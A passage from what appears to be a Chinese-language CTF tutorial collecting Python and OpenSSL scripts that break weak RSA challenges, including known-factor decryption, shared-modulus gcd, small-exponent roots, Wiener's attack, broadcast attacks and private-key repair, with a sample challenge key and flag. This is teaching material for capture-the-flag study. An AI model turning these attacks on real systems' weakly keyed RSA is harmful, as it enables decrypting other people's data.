phin)m=hex(int(pow(int(c),d,n)))flag=binascii.a2b_hex(m[2:-1])print(flag) 十六进制 123456import math#python2N=0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9fe=0x10001d=0x9186c78d098af6815622ea9901cf84a89ead578a6dbdded7d7fc63531756239dc586501216fc2e4bd1a8cee7e62284d16d91195f356d733a52dff011ebc3bf1e5d62af54d0455ea2f6ec948f45f34931f5b0b4478b16c66951a95d2f069a6c8867a6bc673c8e40052a54dbc5c1aeacbbfae7cad150a4f41ef4a02b1c97d70636ae187ed3c45f2551696a6a1172ae4089e033fb4853057c0f1e227d71ccf24fb27073ca4fe4ac3744dfed2cd7763c47ac4ae4d42820a19d68961bc103bb9016197463875169d062b45807e2e86aa17fa65e3088cc75ef35f984d0ca92d4c9270c2e694eb1f5df16b7ebe32b5c1d26086d6aac5fe327288f2904cb54164db39151c=0x3dbf00a02f924a70f44bdd69e73c46241e9f036bfa49a0c92659d8eb0fe47e42068eaf156a9b3ee81651bc0576a91ffed48610c158dc8d2fb1719c7242704f0d965f8798304925a322c121904b91e5fc5eb3dc960b03eb8635be53b995217d4c317126e0ec6e9a9acfd5d915265634a22a612de962cfaa2e0443b78bdf841ff901423ef765e3d98b38bcce114fede1f13e223b9bd8155e913c8670d8b85b1f3bcb99353053cdb4aef1bf16fa74fd81e42325209c0953a694636c0ce0a19949f343dc229b2b7d80c3c43ebe80e89cbe3a3f7c867fd7cee06943886b0718a4a3584c9d9f9a66c9de29fda7cfee30ad3db061981855555eeac01940b1924eb4c301print(hex(pow(c,d,N))[2:-1].decode(&#x27;hex&#x27;)) .pem、.pub、flag.enc公钥：通常是以.pem或.pub结尾的文件。 密文：通常叫做flag.enc之类的。 私钥：pem文件 openssl获取n和e123456789101112131415➜ ~ opensslOpenSSL&gt; rsa -pubin -text -modulus -in /Users/apple/Downloads/mediumRSA/pubkey.pemPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----OpenSSL&gt; 可以看到： 123N=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDE=65537 生成私钥 123456789101112131415161718192021222324import mathimport sysfrom Crypto.PublicKey import RSAkeypair = RSA.generate(1024)keypair.p = 275127860351348928173285174381581152299keypair.q = 319576316814478949870590164193048041239keypair.e = 65537keypair.n = keypair.p * keypair.qQn = int((keypair.p-1) * (keypair.q-1))i = 1while (True): x = (Qn * i ) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&#x27;private.pem&#x27;,&#x27;wb&#x27;)private.write(keypair.exportKey())private.close() 生成FLAG 1OpenSSL&gt; rsautl -decrypt -in &#x2F;root&#x2F;flag.enc -inkey &#x2F;root&#x2F;private.pem 脚本123456from Crypto.PublicKey import RSApublic=RSA.importKey(open(&#x27;/Users/apple/Downloads/mediumRSA/pubkey.pem&#x27;).read())n=public.ne=public.eprint(n)print(e) 题型一知道公钥(pubkey.pem)和密文(flag.enc) openssl求出e、n，破解生成 12345678910111213141516python2或者3import libnum from Crypto.Util.number import long_to_bytes n = 86934482296048119190666062003494800588905656017203025617216654058378322103517 p = 285960468890451637935629440372639283459 q = 304008741604601924494328155975272418463L e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) with open(&#x27;/Users/apple/Desktop/flag.enc&#x27;) as f: c = f.read().encode(&#x27;hex&#x27;) c = int(c,16) m = pow(c,d,n) print long_to_bytes(m) 关于文件形式的密文c，一般都是16进制形式读取，接着再转为整型用于计算。 题型二两个文件public.key和flag.enc 1234567891011121314import libnumimport Crypto.PublicKey.RSAimport Crypto.Cipher.PKCS1_OAEPfrom Crypto.Util.number import long_to_bytes n = 10306247299477991196335954707897189353577589618180446614762218980226685668311143526740800444344046158260556585833057716406703213966249956775927205061731821632025483608182881492214855240841820024816859031176291364212054293818204399157346955465232586109199762630150640804366966946066155685218609638749171632685073 p = 97 q = 106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) key=Crypto.PublicKey.RSA.construct(map(long,[n,e,d]))rsakey=Crypto.Cipher.PKCS1_OAEP.new(key) 唯独密文攻击唯密文攻击指的是在仅知已加密文字的情况下进行穷举攻击，把加法密码和乘法密码联合起来，就得到了所谓的仿射密码(affinecipher)—— 两种密码与一对密钥的组合。 思路：计算q=n/p,对比找出小的那个质数，找到n与200组密文的最大公约数即相当于对n做了分解。 12345678910111213141516171819202122232425import rewith open(&#x27;ciphertext.txt&#x27;, &#x27;r&#x27;) as f: content = f.readlines() e = [] for line in content: res = re.findall(&#x27;^\\d+&#x27;, line) if len(res) &gt; 0: e.append(int(res[0]))n = 135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379def divisors(m, n): c = 1 while c != 0: c = m % n m = n n = c return mif __name__ == &#x27;__main__&#x27;: for i in range(len(e)): print(str(i + 1) + &#x27;:&#x27; + str(divisors(n, e[i]))) 低加密指数分解攻击前提： e=2、密文已知。 1234567import gmpy2 import libnum c = 9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529 m = gmpy2.isqrt(c) m = int(m) m_text = libnum.n2s(m) print(m_text) 前提： e=2 Rabin加密中的N可被分解。 p y12345678910111213141516171819import gmpy2 import libnum e = 2 n = 87924348264132406875276140514499937145050893665602592992418171647042491658461 p = 275127860351348928173285174381581152299 q = 319576316814478949870590164193048041239 c=int(open(&#x27;/Users/apple/Downloads/hardRSA/flag.enc&#x27;,&#x27;rb&#x27;).read().encode(&#x27;hex&#x27;),16) mp=pow(c,(p+1)/4,p) mq=pow(c,(q+1)/4,q) yp=gmpy2.invert(p,q) yq=gmpy2.invert(q,p) r=(yp*p*mq+yq*q*mp)%n rr=n-r s=(yp*p*mq-yq*q*mp)%n ss=n-s print libnum.n2s(r) print libnum.n2s(rr) print libnum.n2s(s) print libnum.n2s(ss) 小明文攻击前提： e较小，一般为3。 12345678910111213141516171819202122#适用情况:e较小,一般为3#公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。 import gmpy2import binasciiimport libnumimport timefrom Crypto.Util.number import long_to_bytesn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 e=3 res=0 #res是m c=int(open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read().encode(&#x27;hex&#x27;),16) print time.asctime() for k in xrange(200000000): if gmpy2.iroot(c+n*k,3)[1]==1: res=gmpy2.iroot(c+n*k,3)[0] print k,res print long_to_bytes(res) print time.asctime() break 模不互素前提： 存在两个或更多模数 ，且gcd(N1,N2)!=1 也就是N1和N2不互质。 判断是否互为素数 1234567891011121314def gcd(a,b): if(b==0): return a else: return gcd(b,a%b)def main(): x = 20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951 y = 18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727 if gcd(x,y)==1: print 1 else: print 0if __name__==&quot;__main__&quot;: main() 1234567891011121314151617import gmpy2 from Crypto.Util.number import long_to_bytes lines = open(&#x27;tmp.txt&#x27;,&#x27;r&#x27;).readlines() c1 = int(lines[2],16) c2 = int(lines[6],16) n1 = int(lines[0]) n2 = int(lines[4]) p1 = gmpy2.gcd(n1, n2) assert (p1 != 1) p2 = n1 / p1 p3 = n2 / p1 e = 0x10001 d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1)) d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1)) m1 = pow(c1, d1, n1) m2 = pow(c2, d2, n2) print long_to_bytes(m1)+long_to_bytes(m2) 数据放在文本中–严格遵守c为十六进制。 123456722257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711e is 655370x15b9bfc47ff3791eee8d13760c676bf6c17b357e663cbf898d5ebb5de19d1ef2b56346ed1e471e014749d63e1d645a1150d0d29cb7a3346841e600b9488ab189d57fd8b31e268e9d0ad9ae173d9c68ab7880e6583adc770d72f33a71c9f2b4c1c039834b4cae08735925e4f04b658b302fc401df629eedc7d0f79108f2bddea08606380977a5434f20725319573d2db76a2909ebe565211cff605aa001922e0cc53b4430f08e352f9ddc6ae144c48cd3494942189330d45dbf0c2fb3356dd54d6140f1169975454fc8ccedb3b8847967165911d94b7577b68215cbee6ee244a68086d080663ebeb3c8cc7c46aaa13a73d88fe3350f9c627b56a31d5da8f5b7b623686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747e is 655370xce4647358e97f5ec92edc325b703996160ec041c056cd0a9e7b3b00f66a431277ef35277671233137929c8325e60f6c60a6399bcecf8b454c7865a56857723364c6c172c462fc6ab03a590882d82ac57d1f5483466b3010f14091a31ca470da5872e2e944918d8142fc0896cb386ca47592d56b63fcb7addbcc6218d676ff6305e1ee79a71eacb6cf84a022e1993500c4f45c72691cc6d4db60d75f9fa95a770e840ffcfc3d058644a054ba265cbde13c41d197cb8cf8235e67046845cd4ecbbf5ec37443a74252aee386fae320a12b2284fabaa0c8af346fde3bfa1b7933fd9f1b673ea0675ec0039c192ee53ae3b06494ecb92f7e44f8b5cfdf6d2bfb42af 低解密指数攻击(e过大、过小)前提： e过大或过小（一般e过大时使用） 1234567891011121314151617181920212223242526272829import gmpy2from Crypto.PublicKey import RSAimport ContinuedFractions, Arithmeticfrom Crypto.Util.number import long_to_bytes def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsedef main(): n = 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L e = 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L c = 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192 d = wiener_hack(e, n) m = pow(c,d,n) print long_to_bytes(m)if __name__==&quot;__main__&quot;: main() 123➜ rsa-wiener-attack-master python steady.pyHacked!flag&#123;Wien3r_4tt@ck_1s_3AsY&#125; 私钥文件修复openssl提取公钥信息，将Modulus替换到脚本中。 私钥文件修复 https://github.com/Zui-Qing-Feng/RSA/blob/master/%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D 生成私钥内容然后跑脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051-----BEGIN RSA PRIVATE KEY-----MIIJKAIBAAKCAgEAwJd4U0VkhH2MxLQg6TNYZ+x4Pmz18FygPu7cJWPQ6yqeuo8ZUqJnC+dusjS4bVB24GrRA893M9ix6dc75escZQwllv2WILl63h2&#x2F;&#x2F;fK2v4E+PkdEQ5i&#x2F;ZS9nfid1+VZHusTwTmcr2uAadxRAKcGoZ1qP9S6+joIxPUMm1JeGKRUUqWk2LHbttZDr7G&#x2F;O1cokHKr2Y&#x2F;gGomLLJnTTW4JLttXgSTJ7YvgFxPcOhlmb8xclAqo8l3iEexb9GvVnzwMXl9DGaYXwjfrO7mgkYwYk4eRM+OmtJcfgwBW7tGdIkAObIH8MF+udE0Srqwilw9zBmIjFzk9ah5sLv73XDqkJWYH6iE9ZYGuEhK3ZxyWM6MDo9yaeN5V84UgpD1HnvZgv9syA5&#x2F;AyC4lRkk7CbVBTKzt3ctG9Gh+S1xJ5YWHFpH6zhevwfG1GA8Xm1YEsun7qjVF9Y1U0KrbU3DFa8Znj3IyDC6Iq1TxBSEFUGqnotnC&#x2F;0&#x2F;7tGRcUlBOzF+OLjm9T7eJE6Eoy1lwNqID1&#x2F;ALpRlXVpNPnxjB3+XPpRFLYE51dv576OrWWeYJbzRlcBqkAlv1MpHOIGuw8Ed65PeBQAB6sIZehln1rFflsyTR&#x2F;cNedLdFISoFx+BLdMrpkMWAIJksJIgODkBd&#x2F;86dyV7+JbeTXQCSLe73fM8D&#x2F;MC7obB0CAwEAAQKCAgAuZ5DPh6XboqC7eKeBaSTBDaI&#x2F;cGOmAbt+znDu9WkOcNuEGhzA426u2Jm8iKVzeXLbSgGIyIFxVaIwtPKyyH6z&#x2F;kREaF+3DNoFEOgE2WmdJRgJS4SwQOrFB7IJHJr5dAeegftg+M0BVQQrcw6uwQHBvXl4W0YA8m&#x2F;I0hhWGxhxZ6nt0&#x2F;MArbtDB2NBOgN9UdJ3sd3iYo2+rM1EO9v9bZyutkPvfyFpzFcfiWPPjWHdJdN+G+Szno9VVUmxKDZWE+moY96a6HH409juattxnLZgU3EUfMGCm&#x2F;GUdugeZNCAGs5S+ym&#x2F;zb6wONigQlomoldnWHVI66flir8++RALcUFWC46IH2FyrAJfWR+c8E5ns8Z+HlnZFFO+z2i&#x2F;xWWc9jqFMqDq0yQccqLUWFqPDVINClfIu7bUoM7QLuEKohdkyTwbcx9zOqVuNg7d18g+Qrm3Ru+uD0ni85mnwWA3kZPdQ6pvJaEDJzRPp0rpZyjEP4p2FtXDbp7I1gy9qH834mmrcH2R5RANmJZFIb0T49beAqF7B3wO0AfCpUj1D827JRKCww1OLv02FVALNPjcf7aIfecFAHTOc56NOwLdB7MvPw4O5LtUaLTHMUxZ1CIzB&#x2F;Ks4P9Yn7O0du9nFxPmYPWCYoXJX+DFOqc3U4atY6bTs2z6QLs6cdPQrltEXeYFRQKCAQEA7iHlusjDSIy9vtxsYzr2qz6CqMUrd8FtaeYf2SCGXHEGfDlYCVNbS0dktyAkZ27mZxAovKzRhRwB04PxtNNboTPdo5iDbqC8J8Kxvz6W6TeCjZLDEyoOunrYdE8SyK&#x2F;1tX7oCrbe+8Xk3pE5RzypwNZbp7V9gQsjJxe6oZlkRTXEGgJDJ5mV+v29ngoNki+zMhTk6emubf23cSmT+f7cw5Cs5+jgaCMrYliciLaejF869+JCcZm2Kj7eCP0lDJ9HMVa+v79nKPeDyvdj680KMNv3RQhVjfavMsoIriIDfKczduzBdtylgBkLsqozoqmhyL&#x2F;MuAY31VwCrLXipyWIzwKCAQEAzwrQ0VVkMYZ7xIxCnv004&#x2F;DyDePSOJkU2ToMaE0Bcf+ypEEu&#x2F;KjW8aU6TKPNWHnAcCL0nzozoZcYNJyrI195DXiT8wXSaL2uR2gum+E71ov85MdIz+z9NTqXJsvRjy5w399n&#x2F;O+g+XeIObAMGi+&#x2F;UdLYLgquPVa7Pd37sPt69Cf1H7TZx9y6+nXH1iCLa5LQm0pgedaQTxbR9EtY&#x2F;Fj2vIc4I5JxduGb3kFm7D3Sc6NqP354hJnmO&#x2F;diiCjxLhVqHiiPuIrmAOSZ4X4VRWOkPMylKoFkx3HxqW1Zkq&#x2F;Hk&#x2F;msjM8IUHBtSKd6Vh3&#x2F;&#x2F;NYUq2SCt2Dys95f6YlonhQfUwKCAQEAwypk7cC8zCkNGe&#x2F;tpSYeJBsHWuq9xVhyI+jHEVzmwbygZA9bZ8k5eWj50lw1edAaZT2JJZk93qollQT+hAT1hBjN&#x2F;dZxYam6i5u1sdfKNzmXdhBicMJ3b75eyHRGINSVvDpWUvGtrwtxmDfNieTd+32zgK&#x2F;uPGS0WsXH38mntFFsdySDhWEK2ro7PdtfZABUDSeytUMgAmV+gvBgpvOKW32nOCpUQQUR+XhGUoXZS5KA8cguTIx+EAGWWCegxceEwZsmmmB0W87&#x2F;5Mj8y7UwNPsSnTFHbSJQVH&#x2F;gvVaDJRajx0QjCxerTGE6hSOZTidYwP7w+aGfAO54ArTPHc5VYQKCAQBVC3RLCHBnh34&#x2F;df3HoOqg1tAWtIYdiYPu1tFR5o+5a&#x2F;bNUZkjX5crG1ufL4mh1iEd7r3cyeN7dL0Un2YM2aK3zde386RCMefsnPbIQPR7ZHU05EccYZSA0NhVr1MdJU5oJzRnyWauElN6nr3Z49MKoTj7cJexynaPKye&#x2F;wwz2TZN6uqbaWejUCJ1Vb3jVbzERGLQYV&#x2F;JfClijqG+c+E4hksmUkwrYckO8P9EvKRXROkbiXejTTwQrjaqDk42+CD3WtYKTozpnE3&#x2F;CCDBkmFFWSBlwJEZpRnylw60Pe&#x2F;TW66&#x2F;dBw27PPMm7ORri1cjXCyRWm&#x2F;3M3N+PtHW9AJtLIbRAoIBABgyTrVuAjXd7qO57px&#x2F;XHtUXvgXudo7XstJ9DYLE4roLEj8zUYDFS9KmGjANcmBpcgbKagWN9SqDQSfo8WkEoAue74n7+8goDbeh0YQ2y0mDmpP34dBwF79USn3O+2lVI+1HXUTfTxOTmLPo5bSsv38HL2t3Ll6cUCg&#x2F;&#x2F;M7IAQbpRME3z8gIe0&#x2F;HNWkZjyRadnBsk1QbEmZ8fBtiEp2LHFjnJLASiU+f38+cqqUFcrGBlNvc&#x2F;7W0SB2a5rp81XRwBGXEGtt+fYlBCWIuHVEih9qFqnP6VAeL6lKMzIpH1rbIrwFoIpMzyrnAjZGOJZ6bBcbgMFtNLBmJMSlmuSIao8&#x3D;-----END RSA PRIVATE KEY----- 1234567891011121314from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP with open(&#x27;/Users/apple/Downloads/godlikeRSA/pubkey.pem&#x27;, &#x27;r&#x27;) as f: key = RSA.importKey(f) N = key.n e = key.e print N print e with open(&#x27;/Users/apple/Downloads/godlikeRSA/1.pem&#x27;, &#x27;r&#x27;) as f: private = RSA.importKey(f) oaep = PKCS1_OAEP.new(private) with open(&#x27;/Users/apple/Downloads/godlikeRSA/flag.enc&#x27;, &#x27;r&#x27;) as f: print oaep.decrypt(f.read()) 低加密指数广播攻击前提： 模数n、密文c不同，明文m、加密指数e相同。 12345678910111213141516171819202122232425262728293031323334353637383940import randomfrom gmpy2 import invert, irootdef broadcast(n1, n2 ,n3, c1, c2, c3): n = [n1, n2, n3] C = [c1, c2, c3] N = 1 for i in n: N *= i Ni = [] for i in n: Ni.append(N / i) T = [] for i in xrange(3): T.append(long(invert(Ni[i], n[i]))) X = 0 for i in xrange(3): X += C[i] * Ni[i] * T[i] m3 = X % N m = iroot(m3, 3) return m[0]def main(): e = 3 c1 = 0x9e84763bdbe246fad0a9cd52fda6233e6128a6210efaf3e6dea4fe272f78ad1f8f5cc7022f62f4f542341128e42d6fd10e67c5f96edbd243917c0151289f7228e44019b8c65a541d7306b398465e26b69cab36cc61e4ac094832b4299bbaf4630b722a0fb4f1997053be97e926f94afb55a0bb6ef00ab694e2f595d9eb8ca96c49f5cbbe194529f68a1aaf6f5151484b471285ba8fc8cd30b55612f35a74dc68e255c363579a80d27ce5090873ac719ba59f2492c91fd28bcce26b6a02bae005cbbd2a4cfe5b93442be8664d2313d412e7e09f545c64b7b74bbc408b6e574d0d300135cba8d6c1d73737d59baca9992ede644d856eb4cfcda562a75743e4b491 c2 = 0x9817fdc7b31a8f9cde1794096d3aa2bc6fe06fe34d4b7c9ca9a77982adf67fd4a7e636659553f4168a16757dc3a75e54ff850b9a94a5270f4f75502c7055a3a389df2ea6b00784a4e78e66901b427253c0f343f127e0ff162a349bb14eb4c1453fc6daace19bba4940d77c435686ef3b59f732072cde2e148d1a64f9682b3f1ceb9a000d87e180a1f9eb20c59dbebc13ddb2e07b64db89217f40369aeec878a45d99909ab2a3e4cdb74aa68890c941315ae289d6667200c53f9a32c8a64bfc74e62898ac03c460f945a13f11ee28860a3cd07526c30aa92eb89442a76549fe4ed8a43d14fdeeb350e90443a3a586db719f8610eb5d4a8f5bd1e481b5ef6e96ef c3 = 0xb0c5ee1ac47c671c918726287e70239147a0357a9638851244785d552f307ed6a049398d3e6f8ed373b3696cfbd0bce1ba88d152f48d4cea82cd5dafd50b9843e3fa2155ec7dd4c996edde630987806202e45821ad6622935393cd996968fc5e251aa3539ed593fe893b15d21ecbe6893eba7fe77b9be935ca0aeaf2ec53df7c7086349eb12792aefb7d34c31c18f3cd7fb68e8a432652ef76096096e1a5d7ace90a282facf2d2760e6b5d98f0c70b23a6db654d10085be9dcc670625646a153b52c6c710efe8eb876289870bdd69cb7b45813e4fcfce815d191838926e9d60dd58be73565cff0e10f4e80122e077a5ee720caedc1617bf6a0bb072bbd2dab0 n1 = 0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555 n2 = 0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867 n3 = 0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303 m = broadcast(n1, n2 ,n3, c1, c2, c3) print mif __name__==&quot;__main__&quot;: main() 1234567891011121314151617181920import gmpy2import timedef CRT(items): N = reduce(lambda x, y: x * y, (i[1] for i in items)) result = 0 for a, n in items: m = N / n d, r, s = gmpy2.gcdext(n, m) if d != 1: raise Exception(&quot;Input not pairwise co-prime&quot;) result += a * s * m return result % N, Ne = 3n = [8564529398597496052509875513481234511905571293608253591774352345237876733293108831203723008958367224489489969614656703455962549261315442327443089652074571708651505447379309166100331065440172781968875497386410667715026180057913363208450111095566219238303387888025161407043477291378931412269049849744457547932264137377411127192940332805452317547219248055802197050456726624516860024108642571703812719370387292166670300197241575461417648592309869669813374010765766544607691011957968652581504886331252936146901456910589102484807039294566703917033093028140452849747910537865958098720693569821256189593894121111357731919189L,12222166297277342805260668042066733749258843622057497574551492680820573970618063356710810891221670366396148862070530068431772630271300064517141331380959413811482890080103511756363920299387620181525172247384085449944650678616398890947062703879307721506228672839270493453501648644787019360131991056158375296484870723717496184332078521221915234959627683952251865227849249752415242124235776428944052873501045127442031423538183282845800971359590735184850648986263721823804859410866927117413289461014754456802566932965710529063515405296476007642849800772934170961993925017146017197762805148533435040675962332469643915192423L,5057224034499776793532654516178914954537547410664409403680432108569079856741764362023185604595829263918927121465578691201904227912897025244771553860102714429349163283510695391193774853323951653123109509215361937850724934183826508070404239791710229214063382081391564954935544392514769166830815475459218792639383796711824752291158895292103354274632470559179266550681095452239666165213986993496109747058314685303485222302144835490056402939133225003233112131275635419321982899965440912525225759368684717157077161771778903529280898069381899400305195745292409238361901176051346615633641550303346790420492393767770845418243L]c = [20010971557789931948130798983030201950038450269144104532821030667924400788869920238579729514672630221804096063149106742412869966814701225466606392171030411339119559280790040322081104363393453503417465768386174002015870794567148694722215873094298859132439253412531445187990845476275251348800166731481176155530755581153710085966976765505591809596417849783597055650440598035159288091495453205698044687869932756053447012994409598155552263807571713982758132066319612777306466708222135510918174055647735727504029507503430288609410745159037684948343055275573269067165460711584845480188706531450367147105629493736100726092945L,19200052919818196558567528701224082155105852846109782021681848107226495293687021416871117444987923837810238872836818190457667509409714021669160815809413653880491792640346474248859559867743715715552372738909255050196638006472279364316678941257894898953088366861786500472095752890593521428325838148184891778283229870316694059734109045397448347320487605412988229047015174998893589731503114337273121463601984792339337970193596813660178636222764332155999993506914518600565394196792457144962180040786607335687020278442899146954126853580244264273526509238060494624980807993322975135366653181977147866567146492356137019414255L,1394721540127922627584993749596603212491913755865039994631041458882716953251760080638497574652888386411767951258467542002582418260315909190241131591474627765734174146981015346732559115044918706641616288474447294129332475081232268241201488455865700933615291016346552048997127415783072860387265063527874160016186183078384940312292521628077750464413013768765371508493304331719166196330883242895556903378707199640686499970367957552543041110199009425369612644492288765891769004579050802446992426813215932250347386859783813875543314196764160792696291742850356532493945652482643696238487389412404616537620013009141601852080L]data = zip(c, n)x, n = CRT(data)m = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits()print m 